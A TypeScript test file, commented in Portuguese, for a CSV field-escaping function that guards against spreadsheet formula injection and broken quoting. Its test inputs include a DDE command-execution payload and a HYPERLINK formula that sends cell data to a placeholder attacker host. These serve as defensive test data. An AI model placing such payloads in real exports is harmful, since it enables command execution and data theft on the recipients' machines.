import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { escapeCsvField } from "../src/utils/csv";

describe("escapeCsvField — injeção de fórmula", () => {
  it("neutraliza '=' no início (fórmula do Excel/Sheets vira texto)", () => {
    assert.equal(escapeCsvField("=1+1"), `"'=1+1"`);
  });

  it("neutraliza '+' no início", () => {
    assert.equal(escapeCsvField("+1+1"), `"'+1+1"`);
  });

  it("neutraliza '-' no início", () => {
    assert.equal(escapeCsvField("-1+1"), `"'-1+1"`);
  });

  it("neutraliza '@' no início", () => {
    assert.equal(escapeCsvField("@SUM(A1:A9)"), `"'@SUM(A1:A9)"`);
  });

  it("neutraliza o payload clássico de execução de comando", () => {
    // =cmd|' /C calc'!A0 — descrição escrita pelo parceiro.
    const payload = `=cmd|' /C calc'!A0`;
    const escapado = escapeCsvField(payload);
    assert.ok(escapado.startsWith(`"'=`), escapado);
  });

  it("neutraliza HYPERLINK, que exfiltra dado do casal para uma URL", () => {
    const escapado = escapeCsvField(`=HYPERLINK("http://mau.example/"&A1,"clique")`);
    assert.ok(escapado.startsWith(`"'=HYPERLINK`), escapado);
    assert.equal(escapado.includes(`""`), true, "as aspas internas não foram duplicadas");
  });

  it("NÃO prefixa aspas quando o caractere perigoso está no meio", () => {
    assert.equal(escapeCsvField("mercado = feira"), `"mercado = feira"`);
    assert.equal(escapeCsvField("2+2"), `"2+2"`);
  });

  it("prefixa cada um dos quatro caracteres perigosos, e só eles", () => {
    for (const c of ["=", "+", "-", "@"]) {
      assert.equal(escapeCsvField(`${c}x`), `"'${c}x"`, c);
    }
    for (const c of ["#", "%", "!", "*", "a", "1"]) {
      assert.equal(escapeCsvField(`${c}x`), `"${c}x"`, c);
    }
  });
});

describe("escapeCsvField — quebra de célula", () => {
  it("duplica as aspas internas", () => {
    assert.equal(escapeCsvField(`diz "oi"`), `"diz ""oi"""`);
  });

  it("duplica aspas repetidas sem deixar célula desbalanceada", () => {
    // Duas aspas viram quatro, mais o par que envolve o campo = seis.
    const escapado = escapeCsvField(`""`);
    assert.equal(escapado, `""""""`);
    const aspas = (escapado.match(/"/g) ?? []).length;
    assert.equal(aspas % 2, 0, "número ímpar de aspas quebra o parser");
  });

  it("mantém a vírgula dentro do campo em vez de criar uma coluna nova", () => {
    assert.equal(escapeCsvField("Mercado, feira e padaria"), `"Mercado, feira e padaria"`);
  });

  it("mantém o ponto e vírgula dentro do campo (separador do Excel pt-BR)", () => {
    assert.equal(escapeCsvField("Mercado; feira"), `"Mercado; feira"`);
  });

  it("mantém a quebra de linha dentro do campo em vez de criar uma linha nova", () => {
    assert.equal(escapeCsvField("linha1\nlinha2"), `"linha1\nlinha2"`);
  });

  it("mantém CRLF dentro do campo", () => {
    assert.equal(escapeCsvField("linha1\r\nlinha2"), `"linha1\r\nlinha2"`);
  });

  it("sempre devolve o campo entre aspas", () => {
    for (const entrada of ["simples", "", "com, vírgula", `com "aspas"`, "=fórmula"]) {
      const escapado = escapeCsvField(entrada);
      assert.ok(escapado.startsWith(`"`) && escapado.endsWith(`"`), escapado);
    }
  });
});

describe("escapeCsvField — valores que não são string", () => {
  it("transforma null em campo vazio", () => {
    assert.equal(escapeCsvField(null), `""`);
  });

  it("transforma undefined em campo vazio", () => {
    assert.equal(escapeCsvField(undefined), `""`);
  });

  it("transforma string vazia em campo vazio", () => {
    assert.equal(escapeCsvField(""), `""`);
  });

  it("serializa número positivo sem prefixo", () => {
    assert.equal(escapeCsvField(42), `"42"`);
  });

  it("número negativo ganha o prefixo de segurança (vira texto na planilha)", () => {
    // Comportamento intencional: o '-' inicial é um vetor de fórmula. Por isso
    // o valor monetário NÃO passa por escapeCsvField no export.
    assert.equal(escapeCsvField(-42), `"'-42"`);
  });

  it("serializa booleano", () => {
    assert.equal(escapeCsvField(true), `"true"`);
    assert.equal(escapeCsvField(false), `"false"`);
  });

  it("não deixa o zero virar campo vazio", () => {
    assert.equal(escapeCsvField(0), `"0"`);
  });
});
